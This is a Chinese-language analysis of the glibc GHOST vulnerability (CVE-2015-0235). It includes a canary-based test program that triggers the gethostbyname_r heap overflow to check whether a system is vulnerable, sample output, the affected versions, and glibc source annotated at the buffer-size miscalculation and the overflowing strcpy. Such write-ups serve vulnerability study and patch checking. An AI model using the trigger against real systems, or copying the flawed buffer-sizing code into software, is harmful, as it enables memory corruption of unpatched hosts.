#CVE-2015-0235分析

##漏洞验证

    #include <netdb.h>
    #include <stdio.h>
    #include <stdlib.h>
    #include <string.h>
    #include <errno.h>
    #define CANARY "in_the_coal_mine"
    struct
    {
      char buffer[1024];
      char canary[sizeof(CANARY)];
    } temp = { "buffer", CANARY };
    
    int main(void)
    {
      struct hostent resbuf;
      struct hostent *result;
      int herrno;
      int retval;
      /*** strlen (name) = size_needed - sizeof (*host_addr) - sizeof (*h_addr_ptrs) - 1; ***/
      size_t len = sizeof(temp.buffer) - 16*sizeof(unsigned char) - 2*sizeof(char *) - 1;
      char name[sizeof(temp.buffer)];
      memset(name, '0', len);
      name[len] = '\0';
      retval = gethostbyname_r(name, &resbuf, temp.buffer, sizeof(temp.buffer), &result, &herrno);
      if (strcmp(temp.canary, CANARY) != 0) 
      {
        puts("vulnerable");
        exit(EXIT_SUCCESS);
      }
      if (retval == ERANGE) 
      {
        puts("not vulnerable");
        exit(EXIT_SUCCESS);
      }
      puts("should not happen");
      exit(EXIT_FAILURE);
    }

结果： 

    [ghost] ./ghost                                              14:54:21
    not vulnerable

glibc版本：  

    [ghost] /lib/i386-linux-gnu/libc.so.6            14:58:00
    GNU C Library (Debian EGLIBC 2.19-3) stable release version 2.19, by Roland McGrath et al.
    Copyright (C) 2014 Free Software Foundation, Inc.
    This is free software; see the source for copying conditions.
    There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
    PARTICULAR PURPOSE.
    Compiled by GNU CC version 4.8.3.
    Compiled on a Linux 3.14.5 system on 2014-06-17.
    Available extensions:
            crypt add-on version 2.1 by Michael Glad and others
            GNU Libidn by Simon Josefsson
            Native POSIX Threads Library by Ulrich Drepper et al
            BIND-8.2.3-T5B
    libc ABIs: UNIQUE IFUNC
    For bug reporting instructions, please see:
    <http://www.debian.org/Bugs/>.

版本太高,已经修复了
##影响版本
glibc-2.2~glibc2.17

##漏洞分析

    int __nss_hostname_digits_dots (const char *name, struct hostent *resbuf,
                    char **buffer, size_t *buffer_size,
                    size_t buflen, struct hostent **result,
                    enum nss_status *status, int af, int *h_errnop)
    {
      int save;
      /* We have to test for the use of IPv6 which can only be done by
         examining `_res'.  */
      if (__res_maybe_init (&_res, 0) == -1)
        {
          if (h_errnop)
        *h_errnop = NETDB_INTERNAL;
          *result = NULL;
          return -1;
        }
      /*
       * disallow names consisting only of digits/dots, unless
       * they end in a dot.
       */
      if (isdigit (name[0]) || isxdigit (name[0]) || name[0] == ':')
        {
          const char *cp;
          char *hostname;
          typedef unsigned char host_addr_t[16];
          host_addr_t *host_addr;
          typedef char *host_addr_list_t[2];
          host_addr_list_t *h_addr_ptrs;
          char **h_alias_ptr;
          size_t size_needed;
          int addr_size;
          switch (af)
        {
        case AF_INET:
          addr_size = INADDRSZ;
          break;
        case AF_INET6:
          addr_size = IN6ADDRSZ;
          break;
        default:
          af = (_res.options & RES_USE_INET6) ? AF_INET6 : AF_INET;
          addr_size = af == AF_INET6 ? IN6ADDRSZ : INADDRSZ;
          break;
        }
          //size_needed 计算错误 差了一个h_alias_ptr指针
          size_needed = (sizeof (*host_addr)
                 + sizeof (*h_addr_ptrs) + strlen (name) + 1);
          if (buffer_size == NULL)
            {
          if (buflen < size_needed)
            {
              if (h_errnop != NULL)
            *h_errnop = TRY_AGAIN;
              __set_errno (ERANGE);
              goto done;
            }
        }
          else if (buffer_size != NULL && *buffer_size < size_needed)
        {
          char *new_buf;
          *buffer_size = size_needed;
          new_buf = (char *) realloc (*buffer, *buffer_size);
          if (new_buf == NULL)
            {
              save = errno;
              free (*buffer);
              *buffer = NULL;
              *buffer_size = 0;
              __set_errno (save);
              if (h_errnop != NULL)
            *h_errnop = TRY_AGAIN;
              *result = NULL;
              goto done;
            }
          *buffer = new_buf;
        }
          memset (*buffer, '\0', size_needed);
          host_addr = (host_addr_t *) *buffer;
          h_addr_ptrs = (host_addr_list_t *)
        ((char *) host_addr + sizeof (*host_addr));
          h_alias_ptr = (char **) ((char *) h_addr_ptrs + sizeof (*h_addr_ptrs));
          hostname = (char *) h_alias_ptr + sizeof (*h_alias_ptr);
          if (isdigit (name[0]))
        {
          for (cp = name;; ++cp)
            {
              if (*cp == '\0')
            {
              int ok;
              if (*--cp == '.')
                break;
              /* All-numeric, no dot at the end. Fake up a hostent as if
                 we'd actually done a lookup.  What if someone types
                 255.255.255.255?  The test below will succeed
                 spuriously... ???  */
              if (af == AF_INET)
                ok = __inet_aton (name, (struct in_addr *) host_addr);
              else
                {
                  assert (af == AF_INET6);
                  ok = inet_pton (af, name, host_addr) > 0;
                }
              if (! ok)
                {
                  *h_errnop = HOST_NOT_FOUND;
                  if (buffer_size)
                *result = NULL;
                  goto done;
                }
               //堆上的缓冲区溢出
              resbuf->h_name = strcpy (hostname, name);
              h_alias_ptr[0] = NULL;
              resbuf->h_aliases = h_alias_ptr;
              (*h_addr_ptrs)[0] = (char *) host_addr;
              (*h_addr_ptrs)[1] = NULL;
              resbuf->h_addr_list = *h_addr_ptrs;
              if (af == AF_INET && (_res.options & RES_USE_INET6))
                {
                  /* We need to change the IP v4 address into the
                 IP v6 address.  */
                  char tmp[INADDRSZ];
                  char *p = (char *) host_addr;
                  int i;
                  /* Save a copy of the IP v4 address. */
                  memcpy (tmp, host_addr, INADDRSZ);
                  /* Mark this ipv6 addr as a mapped ipv4. */
                  for (i = 0; i < 10; i++)
                *p++ = 0x00;
                  *p++ = 0xff;
                  *p++ = 0xff;
                  /* Copy the IP v4 address. */
                  memcpy (p, tmp, INADDRSZ);
                  resbuf->h_addrtype = AF_INET6;
                  resbuf->h_length = IN6ADDRSZ;
                }
              else
                {
                  resbuf->h_addrtype = af;
                  resbuf->h_length = addr_size;
                }
              if (h_errnop != NULL)
                *h_errnop = NETDB_SUCCESS;
              if (buffer_size == NULL)
                *status = NSS_STATUS_SUCCESS;
              else
               *result = resbuf;
              goto done;
            }
              if (!isdigit (*cp) && *cp != '.')
            break;
            }
        }

##参考链接
1. http://www.openwall.com/lists/oss-security/2015/01/27/9
2. http://drops.wooyun.org/papers/4780